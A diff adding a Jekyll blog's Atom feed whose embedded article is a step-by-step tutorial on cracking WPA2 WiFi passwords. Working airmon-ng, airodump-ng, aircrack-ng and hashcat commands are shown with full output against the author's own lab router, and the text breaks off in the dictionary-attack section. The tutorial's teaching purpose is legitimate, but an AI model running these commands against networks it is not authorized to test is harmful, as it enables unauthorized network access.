@@ -1,0 +1,434 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://hackingfordevs.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackingfordevs.com/" rel="alternate" type="text/html" /><updated>2021-04-05T07:48:02+02:00</updated><id>https://hackingfordevs.com/feed.xml</id><title type="html">hackingfordevs</title><subtitle>Hackingfordevs hacking and cyber security blog oriented towards developers, hackers and engineers wishing to gain knowledge in hacking and cyber security.
+</subtitle><author><name>Tomi Jerenko</name><email>jerenkotomi@gmail.com</email></author><entry><title type="html">Hack WiFi Access Points with Aircrack-ng</title><link href="https://hackingfordevs.com/hacking/hack-wifi-access-points-with-aircrack-ng" rel="alternate" type="text/html" title="Hack WiFi Access Points with Aircrack-ng" /><published>2021-04-01T00:00:00+02:00</published><updated>2021-04-01T00:00:00+02:00</updated><id>https://hackingfordevs.com/hacking/hack-wifi-access-points-with-aircrack-ng</id><content type="html" xml:base="https://hackingfordevs.com/hacking/hack-wifi-access-points-with-aircrack-ng">&lt;ol id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#introduction&quot; id=&quot;markdown-toc-introduction&quot;&gt;Introduction&lt;/a&gt;    &lt;ol&gt;
+      &lt;li&gt;&lt;a href=&quot;#used-terminology&quot; id=&quot;markdown-toc-used-terminology&quot;&gt;Used Terminology&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ieee-80211&quot; id=&quot;markdown-toc-ieee-80211&quot;&gt;IEEE 802.11&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#wpa2&quot; id=&quot;markdown-toc-wpa2&quot;&gt;WPA2&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#legal-traps&quot; id=&quot;markdown-toc-legal-traps&quot;&gt;Legal Traps&lt;/a&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#setup&quot; id=&quot;markdown-toc-setup&quot;&gt;Setup&lt;/a&gt;    &lt;ol&gt;
+      &lt;li&gt;&lt;a href=&quot;#used-tools&quot; id=&quot;markdown-toc-used-tools&quot;&gt;Used Tools&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#test-environment&quot; id=&quot;markdown-toc-test-environment&quot;&gt;Test Environment&lt;/a&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#configuring-wireless-nic&quot; id=&quot;markdown-toc-configuring-wireless-nic&quot;&gt;Configuring Wireless NIC&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#capturing-wpa2-handshake&quot; id=&quot;markdown-toc-capturing-wpa2-handshake&quot;&gt;Capturing WPA2 Handshake&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#cracking-wpa2-handshake&quot; id=&quot;markdown-toc-cracking-wpa2-handshake&quot;&gt;Cracking WPA2 Handshake&lt;/a&gt;    &lt;ol&gt;
+      &lt;li&gt;&lt;a href=&quot;#bruteforce-attack&quot; id=&quot;markdown-toc-bruteforce-attack&quot;&gt;Bruteforce Attack&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#dictionary-attack&quot; id=&quot;markdown-toc-dictionary-attack&quot;&gt;Dictionary Attack&lt;/a&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#conclusion&quot; id=&quot;markdown-toc-conclusion&quot;&gt;Conclusion&lt;/a&gt;    &lt;ol&gt;
+      &lt;li&gt;&lt;a href=&quot;#protecting-your-wifi-access-point&quot; id=&quot;markdown-toc-protecting-your-wifi-access-point&quot;&gt;Protecting your WiFi access point.&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#the-push-for-wpa3-dragonfly-handshake&quot; id=&quot;markdown-toc-the-push-for-wpa3-dragonfly-handshake&quot;&gt;The Push for WPA3 Dragonfly Handshake&lt;/a&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;Since hacking wireless networks is a very broad topic, this article shows you the simplest straightforward method to hack WPA2 encrypted WiFi networks using aircrack-ng and hashcat. We will have a look at how to configure your wireless network card, how to sniff traffic, how to catch WPA2 handshake and how to crack it. Together with the given background, this article serves as a very simple introduction to hacking wireless networks. As with other blog posts, the &lt;a href=&quot;/about#disclaimer&quot;&gt;Disclaimer&lt;/a&gt; fully applies here as well.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.wigle.net/&quot;&gt;Wigle.net&lt;/a&gt;, an online database containing statistics and a heat map of 802.11 wireless networks submitted by wardrivers (mostly EU and USA), contains as of this writing about 725 million reported wireless, with about 300 thousand new networks being reported daily. About 79% of those networks are encrypted and about 89% of encrypted networks use WPA2 encryption.&lt;/p&gt;
+
+&lt;p&gt;Since WPA2 is still used predominantely, this article focuses only on it. Let’s start with some quick background.&lt;/p&gt;
+
+&lt;h3 id=&quot;used-terminology&quot;&gt;Used Terminology&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;WiFi device&lt;/strong&gt; is a device using 802.11 standards. For simplification it refers only to 2.4GHz or 5GHz WiFi devices.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Frequency range&lt;/strong&gt; simply means a range of some frequency. For example a frequency range from 1GHz to 10GHz.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Band&lt;/strong&gt; or &lt;strong&gt;Channel&lt;/strong&gt; is a numeral representation of defined Frequency range. For example, 2.4GHz WiFi uses 14 channels or bands.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Bandwidth&lt;/strong&gt; is a width of some band. For example, if a Channel 1 is defined on a Frequency range from 2401 MHz to 2423 MHz, then the Bandwidth of a Channel 1 is 22 MHz.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Data rate&lt;/strong&gt; is the speed at which a device can transmit or receive data. For example, 867 Mbit/s or 1.30 Gbit/s .&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Modulation&lt;/strong&gt; is the process of encoding data in a signal. For example, encoding can be done using changes amplitude (Amplitude Modulation AM) or changes in frequency (Frequency Modulation FM).&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;BSSID&lt;/strong&gt; stands for Basic Service Set IDentifier. It is unique MAC address of a device.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;ESSID&lt;/strong&gt; stands for Extended Service Set IDentifier. It is a name of a device or more devices. One ESSID can have multiple BSSIDs, i.e. multiple routers can share the same ESSID but they each have unique BSSID.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;WPA2&lt;/strong&gt; WiFi Protected Access 2 is an implementation of the 802.11i standard which addresses WiFi traffic encryption.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;NIC&lt;/strong&gt; Network Interface Card, sometimes referred to as network adapter or network card.&lt;/p&gt;
+
+&lt;h3 id=&quot;ieee-80211&quot;&gt;IEEE 802.11&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;802&lt;/em&gt;&lt;/strong&gt; is a bunch networking standards created by Institute of Electrical and Electronics Engineers IEEE addressing Local Area Network LAN, Personal Area Network PAN and Metropolitan Area Network MAN. They’re targeting Layer 1 (Physical) and Layer 2 (Data link) as defined by OSI networking model.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;802.11&lt;/strong&gt; is so called working group, which specifies a subset of standards specialized towards Wireless Local Area Network WLAN. These aren’t just modems and routers used at home, but also other devices operation outside of 2.4GHz and 5GHz frequencies.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;802.11a&lt;/strong&gt;, &lt;strong&gt;802.11b&lt;/strong&gt;, &lt;strong&gt;802.11g&lt;/strong&gt;, &lt;strong&gt;802.11n&lt;/strong&gt;, &lt;strong&gt;802.11ac&lt;/strong&gt;, &lt;strong&gt;802.11ax&lt;/strong&gt; are the actual standards which specify functionalities. These are the common ones to be seen on the back of or in specifications of your WiFi device. They specify things like frequency range, bandwidth, data rate, modulation, etc. The 802.11ax is the newest standard for consumer WiFi devices, however the typical modern WiFi device that you’re most likely to run into use 802.11ac.&lt;/p&gt;
+
+&lt;h3 id=&quot;wpa2&quot;&gt;WPA2&lt;/h3&gt;
+&lt;p&gt;WPA2 encryption is based on Password Based Key Derivation Function 2 (PBKDF2) defined in &lt;a href=&quot;https://tools.ietf.org/html/rfc2898&quot;&gt;RFC 2898&lt;/a&gt;. It uses a cryptographic hash function, such as SHA512 to compute the final output.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PBKDF2(P, S, c, dkLen)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;where P is password, S is salt, c is iteration count, dklen is intended output length. In general this means that password P is concatenated with salt S and they are hashed c times with chosen hashing function. The output is cut off to the length of dkLen.&lt;/p&gt;
+
+&lt;p&gt;WiFi access points uses this function in combination with SHA1 hash function as follows&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;WPA2 key = PBKDF2(wifi password, ESSID, 4096, 256)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;legal-traps&quot;&gt;Legal Traps&lt;/h3&gt;
+&lt;p&gt;All wireless communication systems such as military communication devices, satellites, weather stations, airplane radars, cell towers, medical devices, home WiFi routers and others need interference free radio spectrum in order to be able to communicate. For this reason utilization of radio spectrum is heavily regulated all around the world, and sometimes varies between different countries.&lt;/p&gt;
+
+&lt;p&gt;For rough overview including legal requirements for WiFi devices refer to the &lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_WLAN_channels&quot;&gt;List of WLAN channels&lt;/a&gt;. Note that this list is not legally binding and could be outdated. Regulations usually specify which channels can be utilized, the purpose, maximum permitted output power, whether devices can be used only indoors, etc.&lt;/p&gt;
+
+&lt;p&gt;Keep in mind that going around the street, capturing handshakes and trying to crack them is considered illegal activity.&lt;/p&gt;
+
+&lt;h2 id=&quot;setup&quot;&gt;Setup&lt;/h2&gt;
+
+&lt;p&gt;No special dedicated hardware is used exercise - an integrated wireless network card &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Intel Corporation Wireless-AC 9560&lt;/code&gt; to sniff wireless traffic and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Intel(R) Core(TM) i7-9850H CPU @ 2.60GHz&lt;/code&gt; for cracking.&lt;/p&gt;
+
+&lt;h3 id=&quot;used-tools&quot;&gt;Used Tools&lt;/h3&gt;
+&lt;p&gt;The following tools are used&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Kali Linux - a Linux based OS&lt;/li&gt;
+  &lt;li&gt;airmon-ng - script for turning wireless card into monitor mode&lt;/li&gt;
+  &lt;li&gt;airodump-ng - a wireless packet capture tool&lt;/li&gt;
+  &lt;li&gt;aircrack-ng - 802.11 WEP / WPA-PSK key cracker&lt;/li&gt;
+  &lt;li&gt;hashcat - advanced password recovery tool&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;test-environment&quot;&gt;Test Environment&lt;/h3&gt;
+&lt;p&gt;A simple test environment is configured in which one smartphone device is connected to a WiFi router. While the smartphone and router are exchanging traffic, a sniffer - a laptop with Kali Linux - is passively listening to the traffic flying through air.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/how-to-hack-wifi-access-points/environment-setup.png&quot; alt=&quot;Environment Setup&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;configuring-wireless-nic&quot;&gt;Configuring Wireless NIC&lt;/h2&gt;
+&lt;p&gt;At first it is required to turn off all background processes which could reconfigure network drivers and disrupt the sniffing process. The command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ sudo airmon-ng check kill&lt;/code&gt; checks for all these processes and kills them.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4lv4ti0n:~$ sudo airmon-ng check kill
+Killing these processes:
+    PID Name
+   1005 wpa_supplicant
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next, the wireless network card needs to be turned into monitor mode. This allows it to listen to wireless traffic being sent through air. Command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo airmon-ng start wlan0 36&lt;/code&gt; starts monitor mode for interface &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wlan0&lt;/code&gt; and sets it to channel 36.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4lv4ti0n:~$ sudo airmon-ng start wlan0 36
+PHY     Interface       Driver          Chipset
+phy0    wlan0           iwlwifi         Intel Corporation Wireless-AC 9560 [Jefferson Peak] (rev 10)
+                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The interface &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wlan0&lt;/code&gt; is renamed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wlan0mon&lt;/code&gt;. The settings can be seen with command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iwconfig wlan0mon&lt;/code&gt;. As shown, the wireless network card is now in monitor mode on frequency 5.18GHz (channel 36) and is ready to sniff traffic.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4lv4ti0n:~$ iwconfig wlan0mon
+wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:5.18 GHz  Tx-Power=-2147483648 dBm
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;capturing-wpa2-handshake&quot;&gt;Capturing WPA2 Handshake&lt;/h2&gt;
+&lt;p&gt;The next step is to find out the target’s BSSID. Using airodump-ng on wlan0mon interface with command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo airodump-ng wlan0mon&lt;/code&gt; gives us an overview of what is happening around us. When no channels are set, the tool hops on different channels and listen to all exchanged traffic between devices.&lt;/p&gt;
+
+&lt;p&gt;The tool shows details about all access points and all devices communicating with the access points. For access points, information such as BSSID, power (PWR), receive quality (RXQ), channel (CH), encryption method (ENC) and ESSID can be observed. For connected devices, information such as which access point is it connected to (BSSID), device’s MAC address (STATION) and which access point it is probing for are displayed.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4lv4ti0n:~$ sudo airodump-ng wlan0mon
+
+CH 36 ][ Elapsed: 12 s ][ 2021-03-31 07:04
+
+BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+FC:21:D0:F6:55:1A  -25 100      163       12    0  36 1170   WPA2 CCMP   PSK  wifi-home
+AA:AA:AA:AA:AA:AA  -59 100      161       29    0  36  866   WPA2 CCMP   PSK  some-ap
+BB:BB:BB:BB:BB:BB  -85  73      133       11    0  36  780   WPA2 CCMP   PSK  ap123
+CC:CC:CC:CC:CC:CC  -86   6       48        7    0  36  866   WPA2 CCMP   PSK  router1337
+
+
+BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+FC:21:D0:F6:55:1A  CF:12:0D:6F:55:A1  -28    0 - 6e     0      115
+AA:AA:AA:AA:AA:AA  11:11:11:11:11:11  -66    0 -24      0        2
+AA:AA:AA:AA:AA:AA  22:22:22:22:22:22  -48    0 - 6e     0        6         some-ap
+AA:AA:AA:AA:AA:AA  33:33:33:33:33:33  -71    0 - 6      0        4
+AA:AA:AA:AA:AA:AA  44:44:44:44:44:44  -74    0 - 6      0        6
+AA:AA:AA:AA:AA:AA  55:55:55:55:55:55  -82    0 - 6e     0       52         some-ap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To attack the wifi-home access point, its BSSID is required. With the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo airodump-ng wlan0mon --bssid FC:21:D0:F6:55:1A --channel 36 -w wifihacking&lt;/code&gt; the sniffer on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wlan0mon&lt;/code&gt; interface is started, listening only for packets sent to or from BSSID &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FC:21:D0:F6:55:1A&lt;/code&gt; on channel 36. The packets are written to file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wifihacking&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;As soon as the device connects to the wifi-home access point, the WPA handshake is caught as indicated in the top right corner - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WPA handshake: FC:21:D0:F6:55:1A&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4lv4ti0n:~$ sudo airodump-ng wlan0mon --bssid FC:21:D0:F6:55:1A --channel 36 -w wifihacking
+
+CH 36 ][ Elapsed: 1 min ][ 2021-03-31 07:18 ][ WPA handshake: FC:21:D0:F6:55:1A
+
+BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+FC:21:D0:F6:55:1A  -26 100     1064      141    0  36 1170   WPA2 CCMP   PSK  wifi-home
+
+BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+FC:21:D0:F6:55:1A  CF:12:0D:6F:55:A1  -30    6e- 6e    43      219  PMKID  wifi-home
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The airodump-ng writes data from captured traffic to multiple files. The needed one is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wifihacking-01.cap&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4lv4ti0n:~$ ls -la
+-rw-r--r--  1 root      root      337351 Mar 31 07:18 wifihacking-01.cap
+-rw-r--r--  1 root      root         487 Mar 31 07:18 wifihacking-01.csv
+-rw-r--r--  1 root      root         593 Mar 31 07:18 wifihacking-01.kismet.csv
+-rw-r--r--  1 root      root        3021 Mar 31 07:18 wifihacking-01.kismet.netxml
+-rw-r--r--  1 root      root      204832 Mar 31 07:18 wifihacking-01.log.csv
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;cracking-wpa2-handshake&quot;&gt;Cracking WPA2 Handshake&lt;/h2&gt;
+&lt;p&gt;After having successfully captured the WPA2 handshake, the hashed key is extracted from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wifihacking-01.cap&lt;/code&gt; and converted to a format used by hashcat. Using the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aircrack-ng -j whhashcat wifihacking-01.cap&lt;/code&gt;, it is extracted to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whhashcat.hccapx&lt;/code&gt; file.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4lv4ti0n:~$ aircrack-ng -j whhashcat wifihacking-01.cap
+Reading packets, please wait...
+Opening wifihacking-01.cap
+Read 4117 packets.
+   #  BSSID              ESSID                     Encryption
+   1  FC:21:D0:F6:55:1A  wifi-home                  WPA (1 handshake, with PMKID)
+
+Choosing first network as target.
+Reading packets, please wait...
+Opening wifihacking-01.cap
+Read 4117 packets.
+1 potential targets
+
+Building Hashcat (3.60+) file...
+
+[*] ESSID (length: 8): wifi-home
+[*] Key version: 2
+[*] BSSID: FC:21:D0:F6:55:1A
+[*] STA: CF:12:0D:6F:55:A1
+[*] anonce:
+    07 A2 0D E7 8C 5C 18 1C 39 7D 48 1C C3 2C 65 8C
+    2D 20 4B DC 48 19 6D ED 7E 9A C5 49 E8 42 82 C9
+[*] snonce:
+    0A B3 01 7D 8C 76 C9 85 AA 1E BA 4D 57 FA F4 BD
+    73 3F 77 EA 23 FE B7 00 D7 C4 85 D3 4E 4D D0 81
+[*] Key MIC:
+    33 00 13 C7 50 86 79 C6 83 2B CA 6C 1F 76 FC 00
+[*] eapol:
+    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00
+    00 0A B3 01 7D 8C 76 C9 85 AA 1E BA 4D 57 FA F4
+    BD 73 3F 77 EA 23 FE B7 00 D7 C4 85 D3 4E 4D D0
+    81 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC
+    04 01 00 00 0F AC 02 00 00
+
+Successfully written to whhashcat.hccapx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;bruteforce-attack&quot;&gt;Bruteforce Attack&lt;/h3&gt;
+&lt;p&gt;Having the WPA2 handshake extracted, the hashcat can be used. The command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -a 3 -m 2500 whhashcat.hccapx ?l?l?l?lrouter&lt;/code&gt; is used to start bruteforcing the WPA2 handshake. The flags indicate: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a 3&lt;/code&gt; is brute-force attack type, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-m 2500&lt;/code&gt; is for cracking WPA-EAPOL-PBKDF2 handshake, first input is file name and the second input is mask.&lt;/p&gt;
+
+&lt;p&gt;Each two characters &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?l&lt;/code&gt; in the mask represent any lowercase letter of English alphabet - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdefghijklmnopqrstuvxwyz&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Knowing characteristics of passwords that are being cracker, e.g. the password consists only of lowercase letters or only of numbers, helps to optimize the mask by avoinding unnecessary combination attempts. Since the router’s password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testrouter&lt;/code&gt;, we know that only lowercase letters are used.&lt;/p&gt;
+
+&lt;p&gt;To give you a feeling on how demanding cracking a WPA2 passwords is, the table below gives you a mini benchmark - time estimation and the number of combinations required to bruteforce different combinations. The used cpu is capable of calculating 18k hashes per second.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Mask&lt;/th&gt;
+      &lt;th&gt;Time Estimated&lt;/th&gt;
+      &lt;th&gt;No. Combinations&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;?l?l?l?l?l?l?l?l?l?l&lt;/td&gt;
+      &lt;td&gt;262 years, 258 days&lt;/td&gt;
+      &lt;td&gt;26^10&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;?l?l?l?l?l?l?l?l?lr&lt;/td&gt;
+      &lt;td&gt;10 years, 47 days&lt;/td&gt;
+      &lt;td&gt;26^9&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;?l?l?l?l?l?l?l?ler&lt;/td&gt;
+      &lt;td&gt;143 days, 13 hours&lt;/td&gt;
+      &lt;td&gt;26^8&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;?l?l?l?l?l?l?lter&lt;/td&gt;
+      &lt;td&gt;5 days, 12 hours&lt;/td&gt;
+      &lt;td&gt;26^7&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;?l?l?l?l?l?luter&lt;/td&gt;
+      &lt;td&gt;4 hours, 56 mins&lt;/td&gt;
+      &lt;td&gt;26^6&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;?l?l?l?l?louter&lt;/td&gt;
+      &lt;td&gt;11 mins, 45 secs&lt;/td&gt;
+      &lt;td&gt;26^5&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;?l?l?l?lrouter&lt;/td&gt;
+      &lt;td&gt;25 secs&lt;/td&gt;
+      &lt;td&gt;26^4&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;By using the mask &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?l?l?l?lrouter&lt;/code&gt;, the password is successfully reclaimed.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4lv4ti0n:~$ hashcat -a 3 -m 2500 whhashcat.hccapx ?l?l?l?lrouter
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-9850H CPU @ 2.60GHz, 13684/13748 MB (4096 MB allocatable), 12MCU
+
+Minimum password length supported by kernel: 8
+Maximum password length supported by kernel: 63
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+
+Applicable optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Brute-Force
+* Slow-Hash-SIMD-LOOP
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 67 MB
+
+dc537cde771c:2e9bdf242c40:wifi-home:testrouter
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: WPA-EAPOL-PBKDF2
+Hash.Target......: wifi-home (AP:fc:21:d0:f6:55:1a STA:cf:12:0d:6f:55:a1)
+Time.Started.....: Wed Mar 31 07:47:15 2021 (4 secs)
+Time.Estimated...: Wed Mar 31 07:47:19 2021 (0 secs)
+Guess.Mask.......: ?l?l?l?lrouter [10]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    18936 H/s (9.84ms) @ Accel:512 Loops:128 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 61440/456976 (13.44%)
+Rejected.........: 0/61440 (0.00%)
+Restore.Point....: 0/17576 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:9-10 Iteration:0-1
+Candidates.#1....: tarirouter -&amp;gt; thirrouter
+
+Started: Wed Mar 31 07:47:14 2021
+Stopped: Wed Mar 31 07:47:19 2021
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;dictionary-attack&quot;&gt;Dictionary Attack&lt;/h3&gt;
+&lt;p&gt;Because bruteforce attacks are considered infeasible for longer passwords, dictionaries are used. These usually contain stolen, leaked or precomputed passwords and are used to approach cracking passwords in a smarter way.&lt;/p&gt;
+
+&lt;p&gt;As an example, the famous &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; dictionary is used. It contains 14344391 unique common passwords in plaintext, which are used as key candidates. Since the attacked router doesn’t support passwords shorter than 8 characters, all passwords longer than 8 characters are extracted from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; dictionary.&lt;/p&gt;
+
+&lt;p&gt;In addition, the dictionary doesn’t contain the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testrouter&lt;/code&gt;. To demonstrate the successful dictionary attack, the password is appended to the end of the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou_eightplus.txt&lt;/code&gt;. The final count of password candidates after extraction is 9607062.&lt;/p&gt;
+
